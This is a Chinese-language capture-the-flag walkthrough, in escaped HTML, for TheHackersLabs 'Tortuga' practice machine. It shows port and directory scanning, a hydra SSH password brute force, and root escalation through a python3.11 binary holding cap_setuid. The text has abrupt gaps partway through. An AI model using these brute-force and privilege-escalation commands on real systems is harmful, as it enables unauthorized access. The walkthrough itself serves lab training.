quote\u003e\n\u003cp\u003e\u003ca href=\"https://labs.thehackerslabs.com/machine/131\"\u003ehttps://labs.thehackerslabs.com/machine/131\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsTortuga/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003ePortScan\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Tortuga nmap -sT -min-rate 10000 -p- 192.168.56.120\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 16:50 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.120\nHost is up (0.00076s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:FE:83:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 3.92 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Tortuga nmap -sT -A -p 22,80 192.168.56.120                                            \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 16:51 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.120\nHost is up (0.00040s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)\n| ssh-hostkey: \n|   256 bd:bc:74:bc:a6:ab:09:29:2d:88:42:16:91:93:b1:a4 (ECDSA)\n|_  256 3b:99:fe:7e:ab:ae:b3:a7:05:b2:d1:73:08:6e:e7:a9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Isla Tortuga\nMAC Address: 08:00:27:FE:83:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u0 ue dejado en tu camarote...\"\u003c/span\u003e\n“嘿，船舱男孩，检查一下我留在你船舱里的隐藏纸条......”\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e“\u003ccode\u003egrumete\u003c/code\u003e 检查船舱里的隐藏纸条“ 感觉是一个目录或者用户\u003c/p\u003e\n\u003cp\u003e目录扫描无结果\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Tortuga gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://192.168.56.120/grumete\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.120/grumete\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\nProgress: 661680 / 661683 (100.00%)\n===============================================================\nFinished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行 \u003ccode\u003essh\u003c/code\u003e 爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Tortuga hydra -l grumete -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.120 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC \u0026#x26; David Maciejak - Please \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e not use \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e military or secret service organizations, or \u003cs 03e: 这是要授予的具体能力。\u003ccode\u003eCAP_SETUID\u003c/code\u003e 允许一个进程改变其 UID（用户ID）。这是 SUID (Set User ID) 权限的核心能力。拥有这个能力的进程可以调用 \u003ccode\u003esetuid(0)\u003c/code\u003e 来将自己变成 root 用户。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e=ep\u003c/code\u003e\u003c/strong\u003e: 这指定了要将 \u003ccode\u003ecap_setuid\u003c/code\u003e 添加到哪些 Capability 集合中。\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ee\u003c/code\u003e (Effective)\u003c/strong\u003e: 有效集合。表示当程序运行时，这个能力\u003cstrong\u003e立即生效\u003c/strong\u003e。这是提权的关键。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ep\u003c/code\u003e (Permitted)\u003c/strong\u003e: 许可集合。表示程序被\u003cstrong\u003e允许\u003c/strong\u003e拥有这个能力，即使它暂时没有使用。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e/usr/bin/python3.11\u003c/code\u003e\u003c/strong\u003e: 这是被赋予能力的目标文件，即 Python 3.11 的可执行程序。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecapitan@TheHackersLabs-Tortuga:/tmp$ /usr/bin/python3.11 -c \u003cspan class=\"hljs-string\"\u003e'import os; os.setuid(0); os.system(\"/bin/bash\")'\u003c/span\u003e\nroot@TheHackersLabs-Tortuga:/tmp# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取 root.txt\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@TheHackersLabs-Tortuga:/root# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \nc3fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e","title":"TheHackersLabs - Tortuga","date":"2025-10-01","updated":"2025-10-01","tags":["TheHackersLabs","Linux","Brute","Cappbilities"],"categories":"靶机","comments":true,"description":"Tortuga https://labs.thehackerslabs.com/machine/131 Recon PortScan 枚举 HTTP 页面中的两个链接 “grumete 检查船舱里的隐藏纸条“ 感觉是一个目录或者用户 目录扫描无结果 进行 ssh 爆破 得到密码 1234 进去后能读..."},"recentPosts":[{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year"
